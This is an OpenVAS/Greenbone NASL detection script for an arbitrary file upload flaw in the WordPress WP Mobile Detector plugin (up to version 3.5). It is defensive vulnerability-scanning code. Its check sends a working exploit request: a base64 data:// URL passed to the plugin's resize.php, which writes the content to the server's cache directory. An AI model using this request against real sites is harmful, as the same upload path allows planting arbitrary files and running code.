# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107012");
  script_tag(name:"cvss_base", value:"4.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2016-06-14 10:42:39 +0100 (Tue, 14 Jun 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("WordPress WP Mobile Detector Plugin 3.5 - Arbitrary File Upload Vulnerability");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39891/");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_tag(name:"summary", value:"Remotely upload arbitrary files on WordPress webserver when WP
  Mobile Detector Plugin is installed and enabled.");

  script_tag(name:"insight", value:"An installed and enabled WP Mobile Detector plugin in WordPress
  blogs enable hackers to remotely upload files to WordPress webserver.");

  script_tag(name:"impact", value:"Successful exploitation allows an attacker to load up whatever file
  he wants to the WordPress server. This can result in arbitrary code execution within the context of the vulnerable application.");

  script_tag(name:"affected", value:"WordPress WP Mobile detector plugin up to and including version 3.5");

  script_tag(name:"solution", value:"Update WP Mobile Detector Plugin to version 3.7.");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

vtstrings = get_vt_strings();
str = vtstrings["default_rand"];
data = base64( str:str );

ex = "data://text/plain;base64," + data;

ex_url = dir + "/wp-content/plugins/wp-mobile-detector/resize.php?src=" + urlencode( str:ex );
check_url = dir + "/wp-content/plugins/wp-mobile-detector/cache/" + urlencode( str:"plain;base64," + data );

req = http_get( item:ex_url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( buf =~ "^HTTP/1\.[01] 200" && "GIF89" >< buf ) {

  if( http_vuln_check( port:port, url:check_url, pattern:str, check_header:TRUE) ) {
    report = http_report_vuln_url( port:port, url:ex_url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
